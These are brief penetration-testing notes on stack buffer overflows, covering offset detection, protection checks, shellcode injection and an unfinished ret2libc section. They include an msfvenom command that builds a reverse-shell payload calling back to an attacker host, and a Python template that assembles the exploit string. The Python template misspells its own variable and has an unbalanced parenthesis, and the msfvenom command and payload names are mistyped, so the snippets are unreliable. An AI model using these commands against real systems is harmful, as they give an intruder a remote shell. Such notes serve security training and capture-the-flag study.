# Buffer Overflow

- [pwntools](https://docs.pwntools.com/en/stable/)
- detect offset
	```
	msf-pattern_create -l 5000
	msf-pattern_create -l 5000 -q <pattern>
	```
- check protections
    ```
	checksec <binary>
	cat /proc/sys/kernel/randomize_va_space # ASLR
	```

## Stack Shellcode

- NX Stack, ASLR and Stack Canaries should be disabled
```bash
msf-venom -p linux/x64/shell_reverse/tcp LHOST=<host> LPORT=<port> --format py --bad-chars '\x00'
```
```python
payload_length = 1337 # offset from pattern
buf = "" # insert msfvenom payload
nopsled = "\x90"*20 # adapt if necessary
pad = "A" * ((payload_length - len(nosled)) - len(buf)
rip = "<ADRESS>"[::-1] # little endian

print(nopsled + buf + pad + rip)
```

## Ret2Libc

- ASLR and Stack Canaries should be disabled
- get address of system function, of exit function and of the string ``/bin/sh``
